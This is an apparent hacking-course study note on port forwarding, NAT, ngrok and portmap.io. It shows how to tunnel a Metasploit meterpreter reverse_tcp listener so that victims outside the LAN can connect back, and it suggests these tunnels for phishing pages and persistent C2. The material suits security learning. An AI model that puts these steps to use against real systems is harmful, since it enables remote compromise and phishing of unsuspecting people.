# Day 25 — Port Forwarding

## 🎯 Goal
Understand port forwarding, NAT, and use tools (`ngrok`, `portmap.io`) to expose local services / receive reverse shells over the internet.

---

## 📖 Concepts

### What is Port Forwarding?
A networking technique that allows **remote devices to connect to a specific device inside a private network** by redirecting requests from one network address+port combo to another (usually via the router/firewall). Essential for:
- Online gaming
- Security cameras
- Self-hosted web servers
- **Receiving reverse shells from outside your local network**

### How it works
```
Internet → 78.56.94.176:443 → Router (78.56.94.176) → forwards to → 192.168.1.3:443 (matches rule) ✅
                                                     → 192.168.1.2:9 (no rule)    ❌
                                                     → 192.168.1.4:383 (no rule)  ❌
```
Only the port/IP combination with a matching forwarding rule gets through; everything else is dropped.

### What is NAT?
**Network Address Translation** — maps one IP address space to another by rewriting IP info in packet headers as they pass through a router/firewall.
- Lets many devices on a private network share **one public IP**.
- Conserves scarce IPv4 addresses.
- Also improves security by hiding internal IPs from the outside world.

---

## 🛠️ Tool 1: `ngrok`

### Setup (Linux)
Via `dashboard.ngrok.com/get-started/setup/linux`:
```bash
curl -sSL https://ngrok-agent.s3.amazonaws.com/ngrok.asc \
  | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null \
  && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \
  | sudo tee /etc/apt/sources.list.d/ngrok.list
sudo apt update && sudo apt install ngrok
```
Then configure with your auth token from the dashboard.

### Forward a local web server
```bash
ngrok http 8080
```
Sample output:
```
Session Status    online
Account            you@example.com (Plan: Free)
Region              India (in)
Web Interface      http://127.0.0.1:4040
Forwarding         https://887f-2405-...ngrok-free.app -> http://localhost:8080
```
> The generated `.ngrok-free.app` URL is publicly accessible and tunnels to your local port — perfect for demoing phishing pages, web apps, or Metasploit callback listeners.

### Forward a Meterpreter reverse TCP listener
```bash
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0      # bind to all interfaces
set LPORT 6699
exploit
```
Then use `ngrok tcp 6699` (or a payload pointed at the ngrok TCP address) so a victim **outside your LAN** can connect back to your listener.
```
meterpreter > sysinfo
Computer  : DESKTOP-5RFFFDT
OS        : Windows 10 (10.0 Build 19045)
```

---

## 🛠️ Tool 2: `portmap.io`
Free port-forwarding/OpenVPN-tunnel service — good alternative to manually configuring your router.

### Steps
1. Create account, go to **Configurations → Create new configuration**.
2. Fill in:
   - Name: e.g. `first`
   - Type: `OpenVPN`
   - Proto: `udp`
3. Click **Generate** → downloads an `.ovpn` config file.
4. Start the tunnel:
```bash
openvpn --config HaybusaChingari.first.ovpn
```
5. Create a **mapping rule** (in the dashboard) to forward a public port to your local service port.

---

## ✅ Key Takeaways
- Port forwarding is essential when your **attacking machine is behind NAT/CGNAT** and you need external hosts to reach your listener/payload.
- `ngrok` is the fastest option for quick demos/labs — free tier gives a random public subdomain each session.
- `portmap.io` is useful when you need a **persistent port/IP over OpenVPN**, especially for long-running C2 or reverse shell setups.
- Always bind your listener to `0.0.0.0` (not `127.0.0.1`) when tunneling so external traffic reaches it.
- 
